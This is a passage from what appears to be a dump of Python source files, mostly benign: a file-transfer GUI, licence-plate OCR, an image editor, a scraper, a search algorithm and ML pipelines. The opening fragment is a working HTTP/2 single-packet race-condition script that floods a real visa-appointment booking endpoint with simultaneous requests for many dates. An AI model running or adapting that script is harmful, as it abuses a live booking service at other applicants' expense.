9, '2024-03-08': 11, '2024-03-11': 13, '2024-03-12': 15, '2024-03-13': 17, '2024-03-14': 19, '2024-03-15': 21, '2024-03-18': 23, '2024-03-19': 25, '2024-03-20': 27, '2024-03-21': 29, '2024-03-22': 31, '2024-03-25': 33, '2024-03-26': 35, '2024-03-27': 37, '2024-03-28': 39, '2024-03-29': 41}\n        date_key_list = {43:\"2024-02-21\",45:\"2024-02-22\",47:\"2024-02-23\",49:\"2024-02-24\",51:\"2024-02-25\",53:\"2024-02-28\",55:\"2024-02-29\",57:\"2024-02-30\",59:\"2024-02-31\",1:\"2024-03-01\",3:\"2024-03-04\",5:\"2024-03-05\",7:\"2024-03-06\",9:\"2024-03-07\",11:\"2024-03-08\",13:\"2024-03-11\",15:\"2024-03-12\",17:\"2024-03-13\",19:\"2024-03-14\",21:\"2024-03-15\",23:\"2024-03-18\",25:\"2024-03-19\",27:\"2024-03-20\",29:\"2024-03-21\",31:\"2024-03-22\",33:\"2024-03-25\",35:\"2024-03-26\",37:\"2024-03-27\",39:\"2024-03-28\",41:\"2024-03-29\"}\n        \n        date_key_list_2 = {1:\"2024-02-24\",3:\"2024-02-02\",5:\"2024-02-03\",7:\"2024-02-04\",9:\"2024-02-07\",11:\"2024-02-08\",13:\"2024-02-9\",15:\"2024-02-10\",17:\"2024-02-11\",19:\"2024-02-14\",21:\"2024-02-15\",23:\"2024-02-18\",25:\"2024-02-21\",27:\"2024-02-2\",29:\"2024-02-23\",31:\"2024-02-01\",33:\"2024-02-25\",35:\"2024-02-28\",37:\"2024-02-29\",39:\"2024-02-30\",41:\"2024-02-31\"}\n\n\n\n        all_headers_frames = []  # all headers frame + data frames which have not the last byte\n        all_data_frames = []\n        for s_id in stream_ids_list:\n            new_body = modified_url = re.sub(r\"(AppointmentDate=)\\d{4}-\\d{2}-\\d{2}\", rf\"AppointmentDate={date_key_list[s_id]}\", body)\n    \n            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(\n        method='POST',\n        headers_string=headers,\n        scheme='https',\n        stream_id=s_id,\n        authority=\"algeria.blsspainglobal.com\",\n        body=new_body,\n        path='/DZA/blsappointment/gasd'\n    )\n    \n            all_headers_frames.append(header_frames_without_last_byte)\n            all_data_frames.append(last_data_frame_with_last_byte)\n        temp_headers_bytes = b''\n        for h in all_headers_frames:\n            temp_headers_bytes += bytes(h)\n            \n        temp_data_bytes = b''\n        for d in all_data_frames:\n            temp_data_bytes += bytes(d) \n        h2_conn.send_frames(temp_headers_bytes)\n\n# wait some time\n        sleep(0.1)\n        h2_conn.send_frames(temp_data_bytes)\n        resp = h2_conn.read_response_from_socket(_timeout=10)\n        self.frame_parser[session_number] = h2_frames.FrameParser(h2_connection=h2_conn)\n        self.frame_parser[session_number].add_frames(resp)\n        for sid in stream_ids_list:\n            try:\n                print(f\"------ headers for date {date_key_list[sid]}\")\n                print(type(self.frame_parser[session_number].headers_and_data_frames[sid]['header']))\n                print(self.frame_parser[session_number].headers_and_data_frames[sid]['header'])\n                print(f\"------ response for date {date_key_list[sid]}\")\n                print(self.frame_parser[session_number].headers_and_data_frames[sid]['data'])\n                print(\"----------------------   ----------------------------\")\n            except:\n                pass\n#frame_parser.show_response_of_sent_requests()\n\n# close the connection to stop response parsing an",
    "import socket\nimport os\nimport tkinter as tk\nfrom tkinter.filedialog import askopenfilename, asksaveasfilename\nfrom tkinter.ttk import Progressbar, Style\nfrom threading import Thread\nimport requests\n\nBUFFER_SIZE = 1024\n\ndef get_ip_address():\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    try:\n        # doesn't even have to be reachable\n        s.connect(('10.255.255.255', 1))\n        IP = s.getsockname()[0]\n    except Exception:\n        IP = '127.0.0.1'\n    finally:\n        s.close()\n    return IP\n\ndef send_file():\n    host = entry.get()\n    if not host:\n        return\n\n    filename = askopenfilename()\n    if not filename:\n        return\n\n    port = 5001\n    filesize = os.path.getsize(filename)\n    s = socket.socket()\n    status_label.config(text=\"Trying to connect...\")\n    s.connect((host, port))\n    status_label.config(text=\"Connected.\")\n    s.send(f\"{filename}<SEPARATOR>{filesize}\".encode())\n\n    progress['maximum'] = filesize\n    sent = 0\n\n    with open(filename, \"rb\") as f:\n        while True:\n            bytes_read = f.read(BUFFER_SIZE)\n            if not bytes_read:\n                break\n            s.sendall(bytes_read)\n            sent += len(bytes_read)\n            progress['value'] = sent\n    s.close()\n    status_label.config(text=\"File sent.\")\n\ndef receive_file():\n    host = \"0.0.0.0\"\n    port = 5001\n\n    s = socket.socket()\n    s.bind((host, port))\n    s.listen(5)\n\n    status_label.config(text=\"Listening for incoming connections...\")\n    conn, addr = s.accept()\n    status_label.config(text=f\"Accepted connection from {addr[0]}\")\n\n    data = conn.recv(BUFFER_SIZE)\n    filename, filesize = data.decode().split(\"<SEPARATOR>\")\n    filename = os.path.basename(filename)\n    filesize = int(filesize)\n\n    filename = asksaveasfilename(initialfile=filename)\n    if not filename:\n        return\n\n    progress['maximum'] = filesize\n    received = 0\n\n    with open(filename, \"wb\") as f:\n        while True:\n            bytes_read = conn.recv(BUFFER_SIZE)\n            if not bytes_read:\n                break\n            f.write(bytes_read)\n            received += len(bytes_read)\n            progress['value'] = received\n    conn.close()\n    s.close()\n    status_label.config(text=\"File received.\")\n\nroot = tk.Tk()\nroot.geometry('800x400')\nroot.configure(bg='#1e3c72')\n\nstyle = Style()\nstyle.configure(\"TProgressbar\", thickness=25, troughcolor ='#1e3c72', background='white', )\n\nlabel = tk.Label(root, text=\"Enter Receivers IP address\", bg='#1e3c72', fg='white', font=(\"Helvetica\", 16))\nlabel.pack(pady=10)\n\nentry = tk.Entry(root)\nentry.pack(pady=10)\n\nip_label = tk.Label(root, text=f\"Your IP: {get_ip_address()}\", bg='#1e3c72', fg='white', font=(\"Helvetica\", 16))\nip_label.pack(pady=10)\n\nsend_button = tk.Button(root, text=\"Send file\", command=lambda: Thread(target=send_file).start(), bg='white', fg='#1e3c72')\nsend_button.pack(pady=10)\n\nreceive_button = tk.Button(root, text=\"Receive file\", command=lambda: Thread(target=receive_file).start(), bg='white', fg='#1e3c72')\nreceive_button.pack(pady=10)\n\nprogress = Progressbar(root, length=500, style=\"TProgressbar\")\nprogress.pack(pady=10)\n\nstatus_label = tk.Label(root, text=\"\", bg='#1e3c72', fg='white', font=(\"Helvetica\", 16))\nstatus_label.pack(pady=10)\n\nroot.mainloop()",
    "import streamlit as st\nimport PIL\nimport cv2\nimport numpy as np\nimport imutils\nimport easyocr\nimport tempfile\n\n\n# Setting page layout\nst.set_page_config(\n    page_title=\"Automatic Number Plate License Detection\",  # Setting page title\n    page_icon=\"\ud83d\ude97\",     # Setting page icon\n    layout=\"wide\",      # Setting layout to wide\n    initial_sidebar_state=\"expanded\",    # Expanding sidebar by default   \n)\n\n# Creating sidebar\nwith st.sidebar:\n    st.header(\"Image Config\")     # Adding header to sidebar\n    # Adding file uploader to sidebar for selecting images\n    source_img = st.file_uploader(\n        \"Upload an image...\", type=(\"jpg\", \"jpeg\", \"png\", 'bmp', 'webp'))\n    \n\n# Creating main page heading\nst.title(\"Automatic Number Plate License Detection\")\nst.caption('Upload an image of a vehicle with a number plate.')\nst.caption('Then click the :blue[Detect License Plate] button and check the result.')\n# Creating two columns on the main page\ncol1, col2 = st.columns(2)\n\n\n# Adding image to the first column if image is uploaded\nwith col1:\n    if source_img:\n        # Opening the uploaded image\n        uploaded_image = PIL.Image.open(source_img)\n        print(uploaded_image)\n        # Adding the uploaded image to the page with a caption\n        st.image(source_img,\n                 caption=\"Uploaded Image\",\n                 use_column_width=True\n                 )\n        \n\nif st.sidebar.button('Detect License Plate'):\n    # Save the uploaded image to a temporary file and read it\n    tfile = tempfile.NamedTemporaryFile(delete=True)\n    tfile.write(source_img.read())\n\n    # Read image\n    img = cv2.imread(tfile.name)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n    # Apply filter and find edges for localization\n    bfilter = cv2.bilateralFilter(gray, 11, 17, 17) #Noise reduction\n    edged = cv2.Canny(bfilter, 30, 200) #Edge detection\n\n    # Find contours and apply mask\n    keypoints = cv2.findContours(edged.copy(), cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n    contours = imutils.grab_contours(keypoints)\n    contours = sorted(contours, key=cv2.contourArea, reverse=True)[:10]\n\n    location = None\n    for contour in contours:\n        approx = cv2.approxPolyDP(contour, 10, True)\n        if len(approx) == 4:\n            location = approx\n            break\n\n    mask = np.zeros(gray.shape, np.uint8)\n    new_image = cv2.drawContours(mask, [location], 0,255, -1)\n    new_image = cv2.bitwise_and(img, img, mask=mask)\n\n\n    # Crop license plate\n    (x,y) = np.where(mask==255)\n    (topx, topy) = (np.min(x), np.min(y))\n    (bottomx, bottomy) = (np.max(x), np.max(y))\n    cropped_image = gray[topx:bottomx+1, topy:bottomy+1]\n\n\n    # Use Easy OCR to read text\n    reader = easyocr.Reader(['en'])\n    result = reader.readtext(cropped_image)\n\n    with col2:\n        try:\n            text = result[0][-2]\n        except Exception as e:\n            text = \"No Text Detected\"\n        font = cv2.FONT_HERSHEY_SIMPLEX\n        res = cv2.putText(img, text=text, org=(approx[0][0][0], approx[1][0][1]+60), fontFace=font, fontScale=1, color=(0,255,0), thickness=2, lineType=cv2.LINE_AA)\n        res = cv2.rectangle(img, tuple(approx[0][0]), tuple(approx[2][0]), (0,255,0),3)\n        st.image(cv2.cvtColor(res, cv2.COLOR_BGR2RGB), caption=\"Detected License Plate\", use_column_width=True)\n\n        try:\n            st.write(\"Detected License Plate:\", text)\n        except Exception as e:\n            st.write(\"No License Plate Detected\")",
    "import streamlit as st\nfrom PIL import Image\nimport numpy as np\nimport cv2\n\n# Function to apply grayscale transformation\ndef grayscale(img):\n    return cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n# Function to apply Gaussian blur\ndef blur(img):\n    return cv2.GaussianBlur(img, (15, 15), 0)\n\n# Function to apply rotation\ndef rotate(img, angle):\n    rows, cols = img.shape[:2]\n    matrix = cv2.getRotationMatrix2D((cols / 2, rows / 2), angle, 1)\n    return cv2.warpAffine(img, matrix, (cols, rows))\n\n# Function to apply resizing\ndef resize(img, width, height):\n    return cv2.resize(img, (width, height))\n\n# Function to display image\ndef display_img(img):\n    st.image(img, caption=\"Processed Image\", use_column_width=True)\n\n# Main function\ndef main():\n    st.title(\"Image Processing App\")\n    upload_file = st.file_uploader(\"Choose an Image\", type=[\"jpg\", \"jpeg\", \"png\"])\n\n    if upload_file is not None:\n        image = Image.open(upload_file)\n        img_array = np.array(image)\n\n        st.subheader(\"Original Image\")\n        st.image(image, use_column_width=True)\n\n        operation = [\"Grayscale\", \"Blur\", \"Rotation\", \"Resize\", \"Save\"]\n        selected_operation = st.selectbox(\"Select an operation:\", operation)\n\n        if st.button(\"Apply\"):\n            processed_img = img_array.copy()\n            if selected_operation == \"Grayscale\":\n                processed_img = grayscale(processed_img)\n            elif selected_operation == \"Blur\":\n                processed_img = blur(processed_img)\n            elif selected_operation == \"Rotation\":\n                angle = st.slider(\"Select rotation angle:\", -180, 180, 0)\n                processed_img = rotate(processed_img, angle)\n            elif selected_operation == \"Resize\":\n                new_width = st.number_input(\"Enter new width:\", min_value=1)\n                new_height = st.number_input(\"Enter new height:\", min_value=1)\n                processed_img = resize(processed_img, new_width, new_height)\n            elif selected_operation == \"Save\":\n                im = Image.fromarray(img_array)\n                im.save(\"original_image.png\")\n                st.success(\"Original Image saved successfully.\")\n                im_processed = Image.fromarray(processed_img)\n                im_processed.save(\"processed_image.png\")\n                st.success(\"Processed Image saved successfully.\")\n\n            st.subheader(\"Processed Image\")\n            display_img(processed_img)\n\nif __name__ == \"__main__\":\n    main()\n",
    "#!/usr/bin/env python\n# demo: python .\\generate_post_md.py --title \u6d4b\u8bd5title --category \u5206\u7c7b1 --tag Tag1 --urls url1 url2 --column 2\nimport argparse\nimport datetime\n\ndef generate_markdown_file(title, category, tag, urls, column):\n    # \u6839\u636e\u5f53\u524d\u65e5\u671f\u548c\u6807\u9898\u751f\u6210\u6587\u4ef6\u540d\n    file_name_date = datetime.date.today().strftime(\"%Y-%m-%d\")\n    filename = f\"./_posts/{file_name_date}-{title}.md\"\n\n    post_time = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    # \u6784\u5efaMarkdown\u6587\u4ef6\u5185\u5bb9\n    content = f\"\"\"---\ntitle: {title}\ndate: {post_time} +/-TTTT\ncategories: {category}\ntags: {tag}\n---\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        .gallery {{\n            column-count: {column}; /* \u8bbe\u7f6e\u5217\u6570 */\n            column-gap: 10px; /* \u8bbe\u7f6e\u5217\u4e4b\u95f4\u7684\u95f4\u9699 */\n        }}\n        .gallery img {{\n            width: 100%;\n            break-inside: avoid; /* \u907f\u514d\u56fe\u7247\u8de8\u5217\u663e\u793a */\n            margin-bottom: 10px; /* \u8bbe\u7f6e\u56fe\u7247\u4e4b\u95f4\u7684\u95f4\u9699 */\n        }}\n    </style>\n</head>\n<body>\n\n<div class=\"gallery\">\n\"\"\"\n\n    # \u6dfb\u52a0\u56fe\u7247URL\n    for url in urls:\n        content += f'    <img src=\"{url}\" alt=\"Photo\">\\n'\n\n    content += \"\"\"\n    <!-- \u66f4\u591a\u56fe\u7247 -->\n</div>\n\n</body>\n\"\"\"\n    print(content)\n    # \u5c06\u5185\u5bb9\u5199\u5165\u6587\u4ef6\n    with open(filename, \"w\", encoding=\"utf-8\") as file:\n        file.write(content)\n\n    print(f\"Markdown\u6587\u4ef6\u5df2\u751f\u6210\uff1a{filename}\")\n\nif __name__ == '__main__':\n    # \u521b\u5efa\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790\u5668\n    parser = argparse.ArgumentParser(description=\"\u751f\u6210Markdown\u6587\u4ef6\")\n    parser.add_argument(\"--title\", help=\"\u6807\u9898\")\n    parser.add_argument(\"--category\", help=\"\u5206\u7c7b\uff08\u591a\u4e2a\u5206\u7c7b\u8bf7\u7528\u9017\u53f7\u5206\u9694\uff09\")\n    parser.add_argument(\"--tag\", help=\"\u6807\u7b7e\uff08\u591a\u4e2a\u6807\u7b7e\u8bf7\u7528\u9017\u53f7\u5206\u9694\uff09\")\n    parser.add_argument(\"--urls\", nargs=\"+\", help=\"\u56fe\u7247URL\uff08\u591a\u4e2aURL\u8bf7\u7528\u7a7a\u683c\u5206\u9694\uff09\")\n    parser.add_argument(\"--column\", type=int, default=2, help=\"\u7011\u5e03\u6d41\u6392\u7248\u5217\u6570\")\n\n    # \u89e3\u6790\u547d\u4ee4\u884c\u53c2\u6570\n    args = parser.parse_args()\n    print(args.urls)\n    # \u751f\u6210Markdown\u6587\u4ef6\n    generate_markdown_file(args.title, args.category.split(\",\"), args.tag.split(\",\"), args.urls, args.column)",
    "\"\"\" Importing requests and BeautifulSoup modules\"\"\"\nimport requests\nfrom bs4 import BeautifulSoup\n\nURL: str = \"https://stackoverflow.com\"\nQUESTIONS_URL: str = \"https://stackoverflow.com/questions\"\nURL_PART: str = URL.split(\"//\")\nDOMAIN: str = URL_PART[1]\n# Creating the list which will keep all data\ndata_list: list[str] = []\n\nNAME:str = \"\"\"\n         __                 __                             _____ \n  _______/  |______    ____ |  | _________  __ ____________/ ____\\\\\n /  ___/\\\\   __\\\\__  \\\\ _/ ___\\\\|  |/ /  _ \\\\  \\\\/ // __ \\\\_  __ \\\\   __\\\\ \n \\\\___ \\\\  |  |  / __ \\\\\\\\  \\\\___|    <  <_> )   /\\\\  ___/|  | \\\\/|  |   \n/____  > |__| (____  /\\\\___  >__|_ \\\\____/ \\\\_/  \\\\___  >__|   |__|   \n     \\\\/            \\\\/     \\\\/     \\\\/               \\\\/              \n.__                 \n|  |   ______  _  __\n|  |  /  _ \\\\ \\\\/ \\\\/ /\n|  |_(  <_> )     / \n|____/\\\\____/ \\\\/\\\\_/ \n\n __      __      ___.    \n/  \\\\    /  \\\\ ____\\\\_ |__  \n\\\\   \\\\/\\\\/   // __ \\\\| __ \\\\ \n \\\\        /\\\\  ___/| \\\\_\\\\ \\\\\n  \\\\__/\\\\  /  \\\\___  >___  /\n       \\\\/       \\\\/    \\\\/ \n\n  _________                                 .__                \n /   _____/ ________________  ______ ______ |__| ____    ____  \n \\_____  \\_/ ___\\_  __ \\__  \\ \\____ \\\\____ \\|  |/    \\  / ___\\ \n /        \\  \\___|  | \\// __ \\|  |_> >  |_> >  |   |  \\/ /_/  >\n/_______  /\\___  >__|  (____  /   __/|   __/|__|___|  /\\___  / \n        \\/     \\/           \\/|__|   |__|           \\//_____/                      \n\n    S t a c k o v e r f l o w   W e b   S c r a p p i n g\n\"\"\"\n\n\nprint('Welcome to:',NAME)\n\nkw: str = input(\n    f\"Give us a keyword and we will find the first three posts with answers for you in {DOMAIN}: \"\n)\n\n\ndef find_questions(url: str, keyword: str) -> None:\n\n    \"\"\"Pass a word to works as keyword\n    and will return the first three matches in stackoverflow's questions\"\"\"\n\n    #  Getting current index page\n    part_url = url.split(\"=\")\n    index_page = part_url[-1]\n    # Creating a variable for button next link\n    next_button_link: str = \"\"\n    # Getting the page and transforming it to text\n    page = requests.get(url, timeout=10)\n    page_text = page.text\n    # Creating the object SOUP from the BeautifulSoup class that we imported already\n    SOUP = BeautifulSoup(page_text, \"html.parser\")\n    # Getting th pagination items to get the link to go to next page\n    PAGINATION_ITEMS = SOUP.select(\".s-pagination--item\")\n    # Getting all the questions in a page\n    QUESTIONS = SOUP.select(\".s-post-summary\")\n\n    # if we are on page /questions we print number 1, else we print the pages numbers\n    if \"question\" in index_page:\n        print(f'Looking for a question with \"{keyword}\" in {DOMAIN} page number 1...')\n    else:\n        print(\n            f'Looking for a question with \"{keyword}\" in {DOMAIN} page number {index_page}...'\n        )\n    #  Getting  question by question, and its title, link, we also get the username who posted the question\n    for QUESTION in QUESTIONS:\n        TITLE_QUESTION = QUESTION.select_one(\".s-link\").get_text()\n        LINK_QUESTION = URL + QUESTION.select_one(\".s-link\")[\"href\"]\n        USER_NAME = QUESTION.select_one(\".s-user-card--link\").get_text()\n        responses = QUESTION.select_one(\".s-post-summary--stats-item-number\").get_text()\n        # Saving the data in a variable\n        data: str = f\"User\ud83d\udc64: >{USER_NAME.strip()}<< Asks: ''{TITLE_QUESTION}''    link----> {LINK_QUESTION}\"\n        # If the keyword is in the question title and the question has any responses\n        if \" \" + keyword + \" \" in TITLE_QUESTION and int(responses) > 0:\n            # We add the data collected to the data list\n            data_list.append(data)\n\n    # Getting the link to go to the nex page\n    for item in PAGINATION_ITEMS:\n        if item.get_text().strip().lower() == \"next\":\n            next_button_link = item[\"href\"]\n\n    next_url: str = URL + next_button_link\n\n    if len(data_list) < 3:\n        return find_questions(next_url, keyword)\n    for count, _data in enumerate(data_list):\n        print(f\"{count+1}--{_data}\")\n\n\nfind_questions(QUESTIONS_URL, kw.strip().lower())\n",
    "'''Pesquisa em Profundidade Iterativa (IDS)'''\r\n\r\nfrom collections import deque\r\nfrom classes import *\r\nimport time\r\nimport math\r\nimport itertools\r\nproblem = int(input(\"qual \u00e9 o problema? \"))\r\nmatrix1= problema(problem)\r\n\r\ndef ids(root):\r\n    start_time = time.time()  # Regista o tempo de in\u00edcio da busca\r\n    nodes_searched = 0  # Contador de n\u00f3s explorados\r\n    for depth in itertools.count():  # Loop infinito para aumentar a profundidade da busca\r\n        visited, stack = set(), [(Node(root), 0)]  # Conjunto de n\u00f3s visitados e pilha de n\u00f3s a serem explorados\r\n        while stack:\r\n            node, level = stack.pop()  # Remove o \u00faltimo n\u00f3 da pilha\r\n            nodes_searched += 1  # Incrementa o contador de n\u00f3s explorados\r\n            if node.is_goal():  # Verifica se o n\u00f3 \u00e9 o objetivo\r\n                path = node.get_path()  # Obt\u00e9m o caminho at\u00e9 o n\u00f3 objetivo\r\n                return path, nodes_searched, len(path), time.time() - start_time  # Retorna o caminho, o n\u00famero de n\u00f3s explorados, a profundidade do caminho e o tempo de execu\u00e7\u00e3o\r\n            if level < depth:  # Verifica se o n\u00edvel atual \u00e9 menor que a profundidade atual\r\n                for child in node.get_children():  # Para cada filho do n\u00f3 atual\r\n                    if child not in visited:  # Se o filho ainda n\u00e3o foi visitado\r\n                        visited.add(child)  # Adiciona o filho ao conjunto de n\u00f3s visitados\r\n                        stack.append((child, level + 1))  # Adiciona o filho \u00e0 pilha de n\u00f3s a serem explorados com o n\u00edvel incrementado\r\n    return None, nodes_searched, 0, time.time() - start_time  # Retorna None se n\u00e3o foi encontrado um caminho, o n\u00famero de n\u00f3s explorados, profundidade 0 e o tempo de execu\u00e7\u00e3o\r\n\r\ndef main_ids(matrix1):\r\n    # Executa a busca em profundidade iterativa (IDS) no problema\r\n    result, nodes_searched, depth, time_spent = ids(matrix1)\r\n\r\n    # Abre o arquivo 'output.txt' em modo de escrita e adiciona o resultado da busca\r\n    with open('output.txt', 'a') as f:\r\n        if result is not None:\r\n            # Se um caminho foi encontrado, imprime cada estado do caminho no arquivo\r\n            for node in result:\r\n                print(node.state[0], file=f)\r\n                print(node.state[1], file=f)\r\n                print(node.state[2], file=f)\r\n                print(node.state[3], file=f)\r\n                print(node.state[4], file=f)\r\n                print(node.state[5], file=f)\r\n                print(\"\\n\", file=f)\r\n        else:\r\n            # Se nenhum caminho foi encontrado, imprime uma mensagem de erro no arquivo\r\n            print(\"No solution found.\", file=f)\r\n        # Imprime o n\u00famero do problema e o m\u00e9todo usado para resolver no arquivo\r\n        print(\"Problem number: \",problem, file=f)\r\n        print(\"Method used to solve: IDS\", file=f)\r\n        print(\"\\n\", file=f)  # Adiciona duas linhas em branco\r\n\r\n    # Abre o arquivo 'estatisticas.txt' em modo de escrita e adiciona as estat\u00edsticas da busca\r\n    with open('estatisticas.txt', 'a') as f:\r\n        # Imprime o n\u00famero do problema, o n\u00famero de n\u00f3s explorados, a profundidade do caminho e o tempo de execu\u00e7\u00e3o no arquivo\r\n        print(problem, nodes_searched, depth, time_spent, \"IDS\", file=f)\r\n\r\nmain_ids(matrix1)",
    "from torch import optim\n\nimport conf\nfrom .dnn import DNN\nfrom torch.utils.data import DataLoader\n\nfrom utils.loss_functions import *\nfrom utils import memory\n\ndevice = torch.device(\"cuda:{:d}\".format(conf.args.gpu_idx) if torch.cuda.is_available() else \"cpu\")\n\n\nclass TENT(DNN):\n    def __init__(self, *args, **kwargs):\n        super(TENT, self).__init__(*args, **kwargs)\n\n        # turn on grad for BN params only\n\n        for param in self.net.parameters():  # initially turn off requires_grad for all\n            param.requires_grad = False\n\n        for module in self.net.modules():\n            if isinstance(module, nn.BatchNorm1d) or isinstance(module, nn.BatchNorm2d):\n                # https://pytorch.org/docs/stable/generated/torch.nn.BatchNorm1d.html\n                # TENT: force use of batch stats in train and eval modes: https://github.com/DequanWang/tent/blob/master/tent.py\n                if conf.args.use_learned_stats:\n                    module.track_running_stats = True\n                    module.momentum = conf.args.bn_momentum\n                else:\n                    module.track_running_stats = False\n                    module.running_mean = None\n                    module.running_var = None\n\n                module.weight.requires_grad_(True)\n                module.bias.requires_grad_(True)\n\n        if conf.args.dataset in ['imagenet', 'imagenetoutdist']:  # TENT use SGD for imagenet\n            self.optimizer = optim.SGD(self.net.parameters(), lr=conf.args.opt['learning_rate'],\n                                       weight_decay=conf.args.opt['weight_decay'])\n\n        else:\n            self.optimizer = optim.Adam(self.net.parameters(), lr=conf.args.opt['learning_rate'],\n                                        weight_decay=0.0)\n\n        self.fifo = memory.FIFO(capacity=conf.args.update_every_x)  # required for evaluation\n        self.mem_state = self.mem.save_state_dict()\n\n        self.init_reset(self.net, self.optimizer)\n\n    def test_time_adaptation(self, feats):\n        if len(feats) == 1:\n            self.net.eval()  # avoid BN error\n        else:\n            self.net.train()\n\n        entropy_loss = HLoss()\n\n        preds_of_data = self.net(feats) if conf.args.opt['indices_in_1k'] == None else self.net(feats)[:, conf.args.opt['indices_in_1k']]\n\n        loss = entropy_loss(preds_of_data)\n\n        self.optimizer.zero_grad()\n\n\n        loss.backward()\n\n        self.optimizer.step()\n\n        return self.net, loss.item()\n",
    "from __future__ import annotations\nfrom .CADOCS import LanguageModel\nfrom typing import List\n\n# The structure of the strategy has been created following: https://refactoring.guru/design-patterns/strategy/python/example\n\n# this is the context for our strategy pattern\nclass ModelSelector():\n    def __init__(self, strategy: LanguageModel) -> None:\n        self._strategy = strategy\n\n    # The Context maintains a reference to one of the Strategy objects. \n    # The Context does not know the concrete class of a strategy. \n    # It should work with all strategies via the Strategy interface\n    @property\n    def strategy(self) -> LanguageModel:\n        return self._strategy\n    \n    # we could change the strategy, even at runtime\n    @strategy.setter\n    def strategy(self, strategy: LanguageModel) -> None:\n        self._strategy = strategy\n\n    # we run whichever tool has been selected as the strategy\n    def run(self, message) -> dict:\n        result = self._strategy.give_prediction(message)\n        return result\n",
    "# -*- coding: utf-8 -*-\r\nfrom distutils.core import setup\r\nsetup(\r\n    name='graph',\r\n    version='1.5.2',\r\n    py_modules=['graph'],\r\n    requires = [\"tkinter\"],\r\n    description = \"Graph - tkinter-based framework for simple Python graphics\",\r\n    author = \"Konstantin Polyakov\",\r\n    author_email = \"kpolyakov@mail.ru\",\r\n    maintainer = \"Konstantin Polyakov\",\r\n    maintainer_email = \"kpolyakov@mail.ru\",\r\n    url = \"http://kpolyakov.spb.ru/school/probook/python.htm\",\r\n    download_url = \"http://kpolyakov.spb.ru/school/probook/python.htm\",\r\n    keywords = [\"application\", \"framework\", \"tkinter\", \"graphics\"],\r\n    classifiers = [\r\n        \"Development Status :: 3 - Alpha\",\r\n        \"Environment :: Other Environment\",\r\n        \"Intended Audience :: Developers\",\r\n        \"License :: OSI Approved :: MIT licence\",\r\n        \"Operating System :: OS Independent\",\r\n        \"Programming Language :: Python\",\r\n        \"Programming Language :: Python :: 3\",\r\n        \"Programming Language :: Python :: 3.2\",\r\n        \"Topic :: Software Development\",\r\n        \"Topic :: Software Development :: Build Tools\",\r\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\r\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\r\n        \"Topic :: Software Development :: User Interfaces\",\r\n    ],\r\n    license = \"\"\"\r\nLicensed under MIT licence.\r\n    \"\"\",\r\n    long_description = \"\"\"\r\nGraph: tkinter-based framework for simple graphics\r\n\r\n`Graph` is a **Python3.2+** library designed to simplifying\r\ncoordinate graphics on the basis of tkinter library.\r\n\"\"\"\r\n    )\r\n",
    "## main\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nimport os, argparse\nfrom imblearn.over_sampling import SMOTE\nimport mlflow\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.impute import SimpleImputer\nfrom sklearn.preprocessing import OneHotEncoder, StandardScaler\nfrom sklearn.pipeline import Pipeline, FeatureUnion\nfrom sklearn_features.transformers import DataFrameSelector\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.metrics import f1_score, confusion_matrix, accuracy_score, roc_curve, auc\n\nimport warnings\nwarnings.filterwarnings('ignore')\n\n\n\n## --------------------- Data Preparation ---------------------------- ##\n\n## Read the Dataset\nTRAIN_PATH = os.path.join(os.getcwd(), 'dataset.csv')\ndf = pd.read_csv(TRAIN_PATH)\n\n## Drop first 3 features\ndf.drop(columns=['RowNumber', 'CustomerId', 'Surname'], axis=1, inplace=True)\n\n## Filtering using Age Feature using threshold\ndf.drop(index=df[df['Age'] > 80].index.tolist(), axis=0, inplace=True)\n\n\n## To features and target\nX = df.drop(columns=['Exited'], axis=1)\ny = df['Exited']\n\n## Split to train and test\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, shuffle=True, random_state=45, stratify=y)\n\n\n## --------------------- Data Processing ---------------------------- ##\n\n## Slice the lists\nnum_cols = ['Age', 'CreditScore', 'Balance', 'EstimatedSalary']\ncateg_cols = ['Gender', 'Geography']\n\nready_cols = list(set(X_train.columns.tolist()) - set(num_cols) - set(categ_cols))\n\n\n## For Numerical\nnum_pipeline = Pipeline(steps=[\n                        ('selector', DataFrameSelector(num_cols)),\n                        ('imputer', SimpleImputer(strategy='median')),\n                        ('scaler', StandardScaler())\n                    ])\n\n\n## For Categorical\ncateg_pipeline = Pipeline(steps=[\n                        ('selector', DataFrameSelector(categ_cols)),\n                        ('imputer', SimpleImputer(strategy='most_frequent')),\n                        ('ohe', OneHotEncoder(drop='first', sparse_output=False))\n                    ])\n\n\n## For ready cols\nready_pipeline = Pipeline(steps=[\n                        ('selector', DataFrameSelector(ready_cols)),\n                        ('imputer', SimpleImputer(strategy='most_frequent'))\n                    ])\n\n\n\n## combine all\nall_pipeline = FeatureUnion(transformer_list=[\n                                    ('numerical', num_pipeline),\n                                    ('categorical', categ_pipeline),\n                                    ('ready', ready_pipeline)\n                                ])\n\n## apply\nX_train_final = all_pipeline.fit_transform(X_train)\nX_test_final = all_pipeline.transform(X_test)\n\n\n## --------------------- Impalancing ---------------------------- ##\n\n# 1. use algorithm without taking the effect of imbalancing\n\n## 2. prepare class_weights for solving imbalance dataset\nvals_count = 1 - (np.bincount(y_train) / len(y_train))\nvals_count = vals_count / np.sum(vals_count)  ## normalizing\n\n\ndict_weights = {}\nfor i in range(2):  ## 2 classes (0, 1)\n    dict_weights[i] = vals_count[i]\n\n## 3. Using SMOTE for over sampling\nover = SMOTE(sampling_strategy=0.7)\nX_train_resmapled, y_train_resampled = over.fit_resample(X_train_final, y_train)\n\n\n## --------------------- Modeling ---------------------------- 